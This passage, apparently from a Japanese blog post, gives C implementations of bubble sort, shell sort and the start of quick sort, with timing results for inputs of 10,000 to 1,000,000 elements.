    <span class="n">printf</span><span class="p">(</span><span class="s">"%ld</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">x</span><span class="p">[</span><span class="n">i</span><span class="p">]);</span>
  <span class="p">}</span> 
<span class="p">}</span>

<span class="kt">void</span> <span class="nf">set_array</span><span class="p">(</span><span class="kt">long</span> <span class="n">array</span><span class="p">[],</span> <span class="k">const</span> <span class="kt">long</span> <span class="n">count</span><span class="p">,</span> <span class="k">const</span> <span class="kt">int</span> <span class="n">index</span><span class="p">)</span> <span class="p">{</span>
  <span class="kt">FILE</span> <span class="o">*</span><span class="n">fp</span><span class="p">;</span>
  <span class="kt">char</span> <span class="n">filename</span><span class="p">[</span><span class="mi">50</span><span class="p">];</span>
  <span class="kt">long</span> <span class="n">i</span><span class="p">;</span>
  <span class="kt">long</span> <span class="n">tmp</span><span class="p">;</span>
  <span class="n">sprintf</span><span class="p">(</span><span class="n">filename</span><span class="p">,</span> <span class="s">"data/%ld/%ld-%d"</span><span class="p">,</span> <span class="n">count</span><span class="p">,</span> <span class="n">count</span><span class="p">,</span> <span class="n">index</span><span class="p">);</span>
  <span class="n">fp</span> <span class="o">=</span> <span class="n">fopen</span><span class="p">(</span><span class="n">filename</span><span class="p">,</span> <span class="s">"r"</span><span class="p">);</span>
  <span class="k">if</span> <span class="p">(</span><span class="n">fp</span> <span class="o">==</span> <span class="nb">NULL</span><span class="p">)</span> <span class="p">{</span>
    <span class="n">printf</span><span class="p">(</span><span class="s">"Can't open </span><span class="se">\"</span><span class="s">%s</span><span class="se">\"\n</span><span class="s">"</span><span class="p">,</span> <span class="n">filename</span><span class="p">);</span>
    <span class="n">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
  <span class="p">}</span>
  <span class="k">for</span> <span class="p">(</span><span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="n">count</span><span class="p">;</span> <span class="n">i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
    <span class="k">if</span> <span class="p">(</span><span class="n">fscanf</span><span class="p">(</span><span class="n">fp</span><span class="p">,</span> <span class="s">"%ld"</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">tmp</span><span class="p">)</span> <span class="o">==</span> <span class="o">-</span><span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
      <span class="n">printf</span><span class="p">(</span><span class="s">"Error occurred on fscanf()</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
      <span class="n">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
    <span class="p">}</span>
    <span class="n">array</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">=</span> <span class="n">tmp</span><span class="p">;</span> 
  <span class="p">}</span>
<span class="p">}</span>

<span class="kt">void</span> <span class="nf">bubble_sort</span><span class="p">(</span><span class="kt">long</span> <span class="n">x</span><span class="p">[],</span> <span class="k">const</span> <span class="kt">long</span> <span class="n">n</span><span class="p">)</span> <span class="p">{</span>
  <span class="kt">long</span> <span class="n">i</span><span class="p">,</span> <span class="n">j</span><span class="p">;</span>
  <span class="k">for</span> <span class="p">(</span><span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="n">n</span> <span class="o">-</span> <span class="mi">1</span><span class="p">;</span> <span class="n">i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
    <span class="k">for</span> <span class="p">(</span><span class="n">j</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">j</span> <span class="o">&lt;</span> <span class="n">n</span> <span class="o">-</span> <span class="mi">1</span> <span class="o">-</span> <span class="n">i</span><span class="p">;</span> <span class="n">j</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
      <span class="k">if</span> <span class="p">(</span><span class="n">x</span><span class="p">[</span><span class="n">j</span><span class="p">]</span> <span class="o">&gt;</span> <span class="n">x</span><span class="p">[</span><span class="n">j</span> <span class="o">+</span> <span class="mi">1</span><span class="p">])</span> <span class="p">{</span>
        <span class="n">swap</span><span class="p">(</span><span class="o">&amp;</span><span class="n">x</span><span class="p">[</span><span class="n">j</span><span class="p">],</span> <span class="o">&amp;</span><span class="n">x</span><span class="p">[</span><span class="n">j</span> <span class="o">+</span> <span class="mi">1</span><span class="p">]);</span>
      <span class="p">}</span>
    <span class="p">}</span>
  <span class="p">}</span>
<span class="p">}</span>

<span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">void</span><span class="p">)</span> <span class="p">{</span>
  <span class="kt">long</span> <span class="o">*</span><span class="n">array</span><span class="p">;</span>
  <span class="kt">long</span> <span class="n">count</span><span class="p">;</span>
  <span class="kt">int</span> <span class="n">i</span><span class="p">;</span>
  <span class="kt">long</span> <span class="n">start</span><span class="p">,</span> <span class="n">end</span><span class="p">,</span> <span class="n">score</span><span class="p">[</span><span class="mi">10</span><span class="p">],</span> <span class="n">sum</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
  <span class="n">printf</span><span class="p">(</span><span class="s">"count = "</span><span class="p">);</span>
  <span class="n">scanf</span><span class="p">(</span><span class="s">"%ld"</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">count</span><span class="p">);</span>
  <span class="n">printf</span><span class="p">(</span><span class="s">"</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
  <span class="n">array</span> <span class="o">=</span> <span class="p">(</span><span class="kt">long</span> <span class="o">*</span><span class="p">)</span><span class="n">malloc</span><span class="p">(</span><span class="k">sizeof</span><span class="p">(</span><span class="kt">long</span><span class="p">)</span> <span class="o">*</span> <span class="n">count</span><span class="p">);</span>
  <span class="k">for</span> <span class="p">(</span><span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="mi">10</span><span class="p">;</span> <span class="n">i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
    <span class="n">set_array</span><span class="p">(</span><span class="n">array</span><span class="p">,</span> <span class="n">count</span><span class="p">,</span> <span class="n">i</span><span class="p">);</span>
    <span class="k">if</span> <span class="p">(</span><span class="n">i</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
      <span class="n">printf</span><span class="p">(</span><span class="s">"[Before]:</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
      <span class="n">print_r</span><span class="p">(</span><span class="n">array</span><span class="p">,</span> <span class="n">count</span><span class="p">);</span>
      <span class="n">printf</span><span class="p">(</span><span class="s">"</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
    <span class="p">}</span>
    <span class="n">start</span> <span class="o">=</span> <span class="n">clock</span><span class="p">();</span>
    <span class="n">bubble_sort</span><span class="p">(</span><span class="n">array</span><span class="p">,</span> <span class="n">count</span><span class="p">);</span>
    <span class="n">end</span> <span class="o">=</span> <span class="n">clock</span><span class="p">();</span>
    <span class="k">if</span> <span class="p">(</span><span class="n">i</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
      <span class="n">printf</span><span class="p">(</span><span class="s">"[After]:</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
      <span class="n">print_r</span><span class="p">(</span><span class="n">array</span><span class="p">,</span> <span class="n">count</span><span class="p">);</span>
      <span class="n">printf</span><span class="p">(</span><span class="s">"</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
    <span class="p">}</span>
    <span class="n">score</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">=</span> <span class="n">end</span> <span class="o">-</span> <span class="n">start</span><span class="p">;</span>
    <span class="n">sum</span> <span class="o">+=</span> <span class="n">score</span><span class="p">[</span><span class="n">i</span><span class="p">];</span>
    <span class="n">printf</span><span class="p">(</span><span class="s">"Time[%d]: %ld[msec]</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">i</span><span class="p">,</span> <span class="n">score</span><span class="p">[</span><span class="n">i</span><span class="p">]);</span>
  <span class="p">}</span>
  <span class="n">printf</span><span class="p">(</span><span class="s">"</span><span class="se">\n</span><span class="s">Average: %ld[msec]</span><span class="se">\n\n</span><span class="s">"</span><span class="p">,</span> <span class="n">sum</span> <span class="o">/</span> <span class="mi">10</span><span class="p">);</span>
  <span class="n">free</span><span class="p">(</span><span class="n">array</span><span class="p">);</span>
  <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
<span class="p">}</span>
</pre></div>
</div>

<h2>
<span id="results-" class="fragment"></span><a href="#results-"><i class="fa fa-link"></i></a>Results </h2>

<div class="code-frame" data-lang="text">
<div class="code-lang"><span class="bold">10000</span></div>
<div class="highlight"><pre><span></span>Time[0]: 310[msec]
Time[1]: 308[msec]
Time[2]: 306[msec]
Time[3]: 303[msec]
Time[4]: 304[msec]
Time[5]: 317[msec]
Time[6]: 308[msec]
Time[7]: 307[msec]
Time[8]: 306[msec]
Time[9]: 307[msec]

Average: 307[msec]
</pre></div>
</div>

<div class="code-frame" data-lang="text">
<div class="code-lang"><span class="bold">50000</span></div>
<div class="highlight"><pre><span></span>Time[0]: 8220[msec]
Time[1]: 8210[msec]
Time[2]: 8223[msec]
Time[3]: 8180[msec]
Time[4]: 8265[msec]
Time[5]: 8345[msec]
Time[6]: 8269[msec]
Time[7]: 8232[msec]
Time[8]: 8227[msec]
Time[9]: 8304[msec]

Average: 8247[msec]
</pre></div>
</div>

<div class="code-frame" data-lang="text">
<div class="code-lang"><span class="bold">100000</span></div>
<div class="highlight"><pre><span></span>Time[0]: 33514[msec]
Time[1]: 33537[msec]
Time[2]: 33404[msec]
Time[3]: 33431[msec]
Time[4]: 33601[msec]
Time[5]: 33428[msec]
Time[6]: 33344[msec]
Time[7]: 33352[msec]
Time[8]: 33335[msec]
Time[9]: 33355[msec]

Average: 33430[msec]
</pre></div>
</div>

<div class="code-frame" data-lang="text">
<div class="code-lang"><span class="bold">500000</span></div>
<div class="highlight"><pre><span></span>Time[0]: 841646[msec]
Time[1]: 844127[msec]
Time[2]: 841467[msec]
Time[3]: 841070[msec]
Time[4]: 842152[msec]
Time[5]: 842417[msec]
Time[6]: 839184[msec]
Time[7]: 839047[msec]
Time[8]: 837693[msec]
Time[9]: 839578[msec]

Average: 840838[msec]
</pre></div>
</div>

<div class="code-frame" data-lang="text">
<div class="code-lang"><span class="bold">1000000</span></div>
<div class="highlight"><pre><span></span>O(n^2) に比例していると結果から推察されるので、計算で求めると55～65分程度と思われる。
</pre></div>
</div>

<h1>
<span id="shell-sort" class="fragment"></span><a href="#shell-sort"><i class="fa fa-link"></i></a>Shell Sort</h1>

<h2>
<span id="code-1" class="fragment"></span><a href="#code-1"><i class="fa fa-link"></i></a>Code</h2>

<div class="code-frame" data-lang="c">
<div class="code-lang"><span class="bold">ShellSort.c</span></div>
<div class="highlight"><pre><span></span><span class="cp">#include</span> <span class="cpf">&lt;stdio.h&gt;</span><span class="cp"></span>
<span class="cp">#include</span> <span class="cpf">&lt;stdlib.h&gt;</span><span class="cp"></span>
<span class="cp">#include</span> <span class="cpf">&lt;time.h&gt;</span><span class="cp"></span>

<span class="kt">void</span> <span class="nf">swap</span><span class="p">(</span><span class="kt">long</span> <span class="o">*</span><span class="n">a</span><span class="p">,</span> <span class="kt">long</span> <span class="o">*</span><span class="n">b</span><span class="p">)</span> <span class="p">{</span>
  <span class="kt">long</span> <span class="n">tmp</span> <span class="o">=</span> <span class="o">*</span><span class="n">a</span><span class="p">;</span>
  <span class="o">*</span><span class="n">a</span> <span class="o">=</span> <span class="o">*</span><span class="n">b</span><span class="p">;</span>
  <span class="o">*</span><span class="n">b</span> <span class="o">=</span> <span class="n">tmp</span><span class="p">;</span>
<span class="p">}</span>

<span class="kt">void</span> <span class="nf">print_r</span><span class="p">(</span><span class="k">const</span> <span class="kt">long</span> <span class="n">x</span><span class="p">[],</span> <span class="k">const</span> <span class="kt">long</span> <span class="n">n</span><span class="p">)</span> <span class="p">{</span>
  <span class="kt">long</span> <span class="n">i</span><span class="p">;</span>
  <span class="k">for</span> <span class="p">(</span><span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="mi">10</span> <span class="o">&amp;&amp;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="n">n</span><span class="p">;</span> <span class="n">i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
    <span class="n">printf</span><span class="p">(</span><span class="s">"%ld</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">x</span><span class="p">[</span><span class="n">i</span><span class="p">]);</span>
  <span class="p">}</span>
  <span class="k">if</span> <span class="p">(</span><span class="n">n</span> <span class="o">&lt;=</span> <span class="mi">10</span><span class="p">)</span> <span class="p">{</span>
    <span class="k">return</span><span class="p">;</span>
  <span class="p">}</span> <span class="k">else</span> <span class="k">if</span> <span class="p">(</span><span class="n">n</span> <span class="o">&lt;</span> <span class="mi">20</span><span class="p">)</span> <span class="p">{</span>
    <span class="n">i</span> <span class="o">=</span> <span class="mi">10</span><span class="p">;</span>
  <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
    <span class="n">i</span> <span class="o">=</span> <span class="n">n</span> <span class="o">-</span> <span class="mi">10</span><span class="p">;</span>
  <span class="p">}</span>
  <span class="n">printf</span><span class="p">(</span><span class="s">"...</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
  <span class="k">for</span> <span class="p">(;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="n">n</span><span class="p">;</span> <span class="n">i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
    <span class="n">printf</span><span class="p">(</span><span class="s">"%ld</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">x</span><span class="p">[</span><span class="n">i</span><span class="p">]);</span>
  <span class="p">}</span> 
<span class="p">}</span>

<span class="kt">void</span> <span class="nf">set_array</span><span class="p">(</span><span class="kt">long</span> <span class="n">array</span><span class="p">[],</span> <span class="k">const</span> <span class="kt">long</span> <span class="n">count</span><span class="p">,</span> <span class="k">const</span> <span class="kt">int</span> <span class="n">index</span><span class="p">)</span> <span class="p">{</span>
  <span class="kt">FILE</span> <span class="o">*</span><span class="n">fp</span><span class="p">;</span>
  <span class="kt">char</span> <span class="n">filename</span><span class="p">[</span><span class="mi">50</span><span class="p">];</span>
  <span class="kt">long</span> <span class="n">i</span><span class="p">;</span>
  <span class="kt">long</span> <span class="n">tmp</span><span class="p">;</span>
  <span class="n">sprintf</span><span class="p">(</span><span class="n">filename</span><span class="p">,</span> <span class="s">"data/%ld/%ld-%d"</span><span class="p">,</span> <span class="n">count</span><span class="p">,</span> <span class="n">count</span><span class="p">,</span> <span class="n">index</span><span class="p">);</span>
  <span class="n">fp</span> <span class="o">=</span> <span class="n">fopen</span><span class="p">(</span><span class="n">filename</span><span class="p">,</span> <span class="s">"r"</span><span class="p">);</span>
  <span class="k">if</span> <span class="p">(</span><span class="n">fp</span> <span class="o">==</span> <span class="nb">NULL</span><span class="p">)</span> <span class="p">{</span>
    <span class="n">printf</span><span class="p">(</span><span class="s">"Can't open </span><span class="se">\"</span><span class="s">%s</span><span class="se">\"\n</span><span class="s">"</span><span class="p">,</span> <span class="n">filename</span><span class="p">);</span>
    <span class="n">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
  <span class="p">}</span>
  <span class="k">for</span> <span class="p">(</span><span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="n">count</span><span class="p">;</span> <span class="n">i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
    <span class="k">if</span> <span class="p">(</span><span class="n">fscanf</span><span class="p">(</span><span class="n">fp</span><span class="p">,</span> <span class="s">"%ld"</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">tmp</span><span class="p">)</span> <span class="o">==</span> <span class="o">-</span><span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
      <span class="n">printf</span><span class="p">(</span><span class="s">"Error occurred on fscanf()</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
      <span class="n">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
    <span class="p">}</span>
    <span class="n">array</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">=</span> <span class="n">tmp</span><span class="p">;</span> 
  <span class="p">}</span>
<span class="p">}</span>

<span class="kt">void</span> <span class="nf">shell_sort</span><span class="p">(</span><span class="kt">long</span> <span class="n">x</span><span class="p">[],</span> <span class="k">const</span> <span class="kt">long</span> <span class="n">n</span><span class="p">)</span> <span class="p">{</span>
  <span class="kt">long</span> <span class="n">i</span><span class="p">,</span> <span class="n">j</span><span class="p">,</span> <span class="n">k</span><span class="p">,</span> <span class="n">m</span><span class="p">;</span>
  <span class="k">for</span> <span class="p">(</span><span class="n">m</span> <span class="o">=</span> <span class="n">n</span> <span class="o">/</span> <span class="mi">2</span><span class="p">;</span> <span class="n">m</span> <span class="o">&gt;</span> <span class="mi">0</span><span class="p">;</span> <span class="n">m</span> <span class="o">/=</span> <span class="mi">2</span><span class="p">)</span> <span class="p">{</span>
    <span class="k">for</span> <span class="p">(</span><span class="n">i</span> <span class="o">=</span> <span class="n">m</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="n">n</span><span class="p">;</span> <span class="n">i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
      <span class="k">for</span> <span class="p">(</span><span class="n">j</span> <span class="o">=</span> <span class="n">i</span> <span class="o">-</span> <span class="n">m</span><span class="p">;</span> <span class="n">j</span> <span class="o">&gt;=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">j</span> <span class="o">-=</span> <span class="n">m</span><span class="p">)</span> <span class="p">{</span>
        <span class="k">if</span> <span class="p">(</span><span class="n">x</span><span class="p">[</span><span class="n">j</span><span class="p">]</span> <span class="o">&lt;=</span> <span class="n">x</span><span class="p">[</span><span class="n">j</span> <span class="o">+</span> <span class="n">m</span><span class="p">])</span> <span class="p">{</span>
          <span class="k">break</span><span class="p">;</span>
        <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
          <span class="n">swap</span><span class="p">(</span><span class="o">&amp;</span><span class="n">x</span><span class="p">[</span><span class="n">j</span><span class="p">],</span> <span class="o">&amp;</span><span class="n">x</span><span class="p">[</span><span class="n">j</span> <span class="o">+</span> <span class="n">m</span><span class="p">]);</span>
        <span class="p">}</span>
      <span class="p">}</span>
    <span class="p">}</span>
  <span class="p">}</span>
<span class="p">}</span>

<span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">void</span><span class="p">)</span> <span class="p">{</span>
  <span class="kt">long</span> <span class="o">*</span><span class="n">array</span><span class="p">;</span>
  <span class="kt">long</span> <span class="n">count</span><span class="p">;</span>
  <span class="kt">int</span> <span class="n">i</span><span class="p">;</span>
  <span class="kt">long</span> <span class="n">start</span><span class="p">,</span> <span class="n">end</span><span class="p">,</span> <span class="n">score</span><span class="p">[</span><span class="mi">10</span><span class="p">],</span> <span class="n">sum</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
  <span class="n">printf</span><span class="p">(</span><span class="s">"count = "</span><span class="p">);</span>
  <span class="n">scanf</span><span class="p">(</span><span class="s">"%ld"</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">count</span><span class="p">);</span>
  <span class="n">printf</span><span class="p">(</span><span class="s">"</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
  <span class="n">array</span> <span class="o">=</span> <span class="p">(</span><span class="kt">long</span> <span class="o">*</span><span class="p">)</span><span class="n">malloc</span><span class="p">(</span><span class="k">sizeof</span><span class="p">(</span><span class="kt">long</span><span class="p">)</span> <span class="o">*</span> <span class="n">count</span><span class="p">);</span>
  <span class="k">for</span> <span class="p">(</span><span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="mi">10</span><span class="p">;</span> <span class="n">i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
    <span class="n">set_array</span><span class="p">(</span><span class="n">array</span><span class="p">,</span> <span class="n">count</span><span class="p">,</span> <span class="n">i</span><span class="p">);</span>
    <span class="k">if</span> <span class="p">(</span><span class="n">i</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
      <span class="n">printf</span><span class="p">(</span><span class="s">"[Before]:</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
      <span class="n">print_r</span><span class="p">(</span><span class="n">array</span><span class="p">,</span> <span class="n">count</span><span class="p">);</span>
      <span class="n">printf</span><span class="p">(</span><span class="s">"</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
    <span class="p">}</span>
    <span class="n">start</span> <span class="o">=</span> <span class="n">clock</span><span class="p">();</span>
    <span class="n">shell_sort</span><span class="p">(</span><span class="n">array</span><span class="p">,</span> <span class="n">count</span><span class="p">);</span>
    <span class="n">end</span> <span class="o">=</span> <span class="n">clock</span><span class="p">();</span>
    <span class="k">if</span> <span class="p">(</span><span class="n">i</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
      <span class="n">printf</span><span class="p">(</span><span class="s">"[After]:</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
      <span class="n">print_r</span><span class="p">(</span><span class="n">array</span><span class="p">,</span> <span class="n">count</span><span class="p">);</span>
      <span class="n">printf</span><span class="p">(</span><span class="s">"</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
    <span class="p">}</span>
    <span class="n">score</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">=</span> <span class="n">end</span> <span class="o">-</span> <span class="n">start</span><span class="p">;</span>
    <span class="n">sum</span> <span class="o">+=</span> <span class="n">score</span><span class="p">[</span><span class="n">i</span><span class="p">];</span>
    <span class="n">printf</span><span class="p">(</span><span class="s">"Time[%d]: %ld[msec]</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">i</span><span class="p">,</span> <span class="n">score</span><span class="p">[</span><span class="n">i</span><span class="p">]);</span>
  <span class="p">}</span>
  <span class="n">printf</span><span class="p">(</span><span class="s">"</span><span class="se">\n</span><span class="s">Average: %ld[msec]</span><span class="se">\n\n</span><span class="s">"</span><span class="p">,</span> <span class="n">sum</span> <span class="o">/</span> <span class="mi">10</span><span class="p">);</span>
  <span class="n">free</span><span class="p">(</span><span class="n">array</span><span class="p">);</span>
  <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
<span class="p">}</span>
</pre></div>
</div>

<h2>
<span id="results" class="fragment"></span><a href="#results"><i class="fa fa-link"></i></a>Results</h2>

<div class="code-frame" data-lang="text">
<div class="code-lang"><span class="bold">10000</span></div>
<div class="highlight"><pre><span></span>Time[0]: 2[msec]
Time[1]: 3[msec]
Time[2]: 3[msec]
Time[3]: 2[msec]
Time[4]: 3[msec]
Time[5]: 2[msec]
Time[6]: 3[msec]
Time[7]: 2[msec]
Time[8]: 3[msec]
Time[9]: 2[msec]

Average: 2[msec]
</pre></div>
</div>

<div class="code-frame" data-lang="text">
<div class="code-lang"><span class="bold">50000</span></div>
<div class="highlight"><pre><span></span>Time[0]: 16[msec]
Time[1]: 17[msec]
Time[2]: 17[msec]
Time[3]: 16[msec]
Time[4]: 17[msec]
Time[5]: 17[msec]
Time[6]: 17[msec]
Time[7]: 17[msec]
Time[8]: 17[msec]
Time[9]: 17[msec]

Average: 16[msec]
</pre></div>
</div>

<div class="code-frame" data-lang="text">
<div class="code-lang"><span class="bold">100000</span></div>
<div class="highlight"><pre><span></span>Time[0]: 38[msec]
Time[1]: 39[msec]
Time[2]: 38[msec]
Time[3]: 39[msec]
Time[4]: 39[msec]
Time[5]: 38[msec]
Time[6]: 37[msec]
Time[7]: 37[msec]
Time[8]: 38[msec]
Time[9]: 37[msec]

Average: 38[msec]
</pre></div>
</div>

<div class="code-frame" data-lang="text">
<div class="code-lang"><span class="bold">500000</span></div>
<div class="highlight"><pre><span></span>Time[0]: 248[msec]
Time[1]: 262[msec]
Time[2]: 246[msec]
Time[3]: 253[msec]
Time[4]: 256[msec]
Time[5]: 271[msec]
Time[6]: 249[msec]
Time[7]: 254[msec]
Time[8]: 251[msec]
Time[9]: 254[msec]

Average: 254[msec]
</pre></div>
</div>

<div class="code-frame" data-lang="text">
<div class="code-lang"><span class="bold">1000000</span></div>
<div class="highlight"><pre><span></span>Time[0]: 578[msec]
Time[1]: 561[msec]
Time[2]: 567[msec]
Time[3]: 585[msec]
Time[4]: 594[msec]
Time[5]: 575[msec]
Time[6]: 568[msec]
Time[7]: 567[msec]
Time[8]: 628[msec]
Time[9]: 576[msec]

Average: 579[msec]
</pre></div>
</div>

<h1>
<span id="quick-sort" class="fragment"></span><a href="#quick-sort"><i class="fa fa-link"></i></a>Quick Sort</h1>

<h2>
<span id="code-2" class="fragment"></span><a href="#code-2"><i class="fa fa-link"></i></a>Code</h2>

<div class="code-frame" data-lang="c">
<div class="code-lang"><span class="bold">QuickSort.c</span></div>
<div class="highlight"><pre><span></span><span class="cp">#include</span> <span class="cpf">&lt;stdio.h&gt;</span><span class="cp"></span>
<span class="cp">#include</span> <span class="cpf">&lt;stdlib.h&gt;</span><span class="cp"></span>
<span class="cp">#include</span> <span class="cpf">&lt;time.h&gt;</span><span class="cp"></span>

<span class="kt">void</span> <span class="nf">swap</span><span class="p">(</span><span class="kt">long</span> <span class="o">*</span><span class="n">a</span><span class="p">,</span> <span class="kt">long</span> <span class="o">*</span><span class="n">b</span><span class="p">)</span> <span class="p">{</span>
  <span class="kt">long</span> <span class="n">tmp</span> <span class="o">=</span> <span class="o">*</span><span class="n">a</span><span class="p">;</span>
  <span class="o">*</span><span class="n">a</span> <span class="o">=</span> <span class="o">*</span><span class="n">b</span><span class="p">;</span>
  <span class="o">*</span><span class="n">b</span> <span class="o">=</span> <span class="n">tmp</span><span class="p">;</span>
<span class="p">}</span>

<span class="kt">void</span> <span class="nf">print_r</span><span class="p">(</span><span class="k">const</span> <span class="kt">long</span> <span class="n">x</span><span class="p">[],</span> <span class="k">const</span> <span class="kt">long</span> <span class="n">n</span><span class="p">)</span> <span class="p">{</span>
  <span class="kt">long</span> <span class="n">i</span><span class="p">;</span>
  <span class="k">for</span> <span class="p">(</span><span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="mi">10</span> <span class="o">&amp;&amp;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="n">n</span><span class="p">;</span> <span class="n">i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
    <span class="n">printf</span><span class="p">(</span><span class="s">"%ld</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">x</span><span class="p">[</span><span class="n">i</span><span class="p">]);</span>
  <span class="p">}</span>
  <span class="k">if</span> <span class="p">(</span><span class="n">n</span> <span class="o">&lt;=</span> <span class="mi">10</span><span class="p">)</span> <span class="p">{</span>
    <span class="k">return</span><span class="p">;</span>
  <span class="p">}</span> <span class="k">else</span> <span class="k">if</span> <span class="p">(</span><span class="n">n</span> <span class="o">&lt;</span> <span class="mi">20</span><span class="p">)</span> <span class="p">{</span>
    <span class="n">i</span> <span class="o">=</span> <span class="mi">10</span><span class="p">;</span>
  <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
    <span class="n">i</span> <span class="o">=</span> <span class="n">n</span> <span class="o">-</span> <span class="mi">10</span><span class="p">;</span>
  <span class="p">}</span>
  <span class="n">printf</span><span class="p">(</span><span class="s">"...</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
  <span class="k">for</span> <span class="p">(;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="n">n</span><span class="p">;</span> <span class="n">i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
    <span class="n">printf</span><span class="p">(</span><span class="s">"%ld</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">x</span><span class="p">[</span><span class="n">i</span><span class="p">]);</span>
  <span class="p">}</span> 
<span class="p">}</span>

<span class="kt">void</span> <span class="nf">set_array</span><span class="p">(</span><span class="kt">long</span> <span class="n">array</span><span class="p">[],</span> <span class="k">const</span> <span class="kt">long</span> <span class="n">count</span><span class="p">,</span> <span class="k">const</span> <span class="kt">int</span> <span class="n">index</span><span class="p">)</span> <span class="p">{</span>
  <span class="kt">FILE</span> <span class="o">*</span><span class="n">fp</span><span class="p">;</span>
  <span class="kt">char</span> <span class="n">filename</span><span class="p">[</span><span class="mi">50</span><span class="p">];</span>
  <span class="kt">long</span> <span class="n">i</span><span class="p">;</span>
  <span class="kt">long</span> <span class="n">tmp</span><span class="p">;</span>
  <span class="n">sprintf</span><span class="p">(</span><span class="n">filename</span><span class="p">,</span> <span class="s">"data/%ld/%ld-%d"</span><span class="p">,</span> <span class="n">count</span><span class="p">,</span> <span class="n">count</span><span class="p">,</span> <span class="n">index</span><span class="p">);</span>
  <span class="n">fp</span> <span class="o">=</span> <span class="n">fopen</span><span class="p">(</span><span class="n">filename</span><span class="p">,</span> <span class="s">"r"</span><span class="p">);</span>
  <span class="k">if</span> <span class="p">(</span><span class="n">fp</span> <span class="o">==</span> <span class="nb">NULL</span><span class="p">)</span> <span class="p">{</span>
    <span class="n">printf</span><span class="p">(</span><span class="s">"Can't open </span><span class="se">\"</span><span class="s">%s</span><span class="se">\"\n</span><span class="s">"</span><span class="p">,</span> <span class="n">filename</span><span class="p">);</span>
    <span class="n">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
  <span class="p">}</span>
